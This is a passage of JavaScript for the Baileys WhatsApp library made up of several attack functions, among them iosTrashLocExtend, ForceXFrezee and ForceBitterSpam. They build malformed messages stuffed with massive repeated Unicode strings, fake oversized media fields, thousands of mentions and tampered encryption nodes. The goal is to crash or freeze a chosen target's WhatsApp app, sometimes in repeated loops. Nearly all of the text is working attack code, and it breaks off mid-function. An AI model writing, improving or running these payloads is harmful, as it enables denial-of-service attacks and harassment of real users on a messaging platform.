        },
      },
    }, {});
    
   await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "ven.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "void is ios",
          title: "@voidengine",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "void engine",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/hery",
         mediaUrl: "https://t.me/hery",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: target }
 });
 
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function NotifXButton(sock, target) {
  try {
    const content = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: { title: "VenomXGaa" + "ꦽ".repeat(10000)+".com" },
            body: { text: "Beritahu aku cari melupakan mu... Seperti kau ajarkan ku dewasa..." },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, content, {
      userJid: sock?.user?.id
    });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (error) {
  }
}

async function ForceXFrezee(sock, target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "🩸© SyrenV7Pro" + "ꦾ".repeat(77777),
      publisher: "𝐊𝐎𝐑𝐙𝐙 𝐈𝐒 𝐇𝐄𝐑𝐄",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "🩸© Korzz is Here" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "🩸© Korzz Is Here" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}

async function ForceBitterSpam(sock, target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let ZayCoreX = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: '🩸YT ZayyOfficial'
                    },
                    footer: {
                        text: '🩸YT ZayyOfficial'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: '🩸YT ZayyOfficial'
                            },
                            footer: {
                                text: '🩸YT ZayyOfficial'
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, ZayCoreX, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}

async function NarendraForce(sock, target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = sock.createParticipantNodes.bind(sock);
let yntkts = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
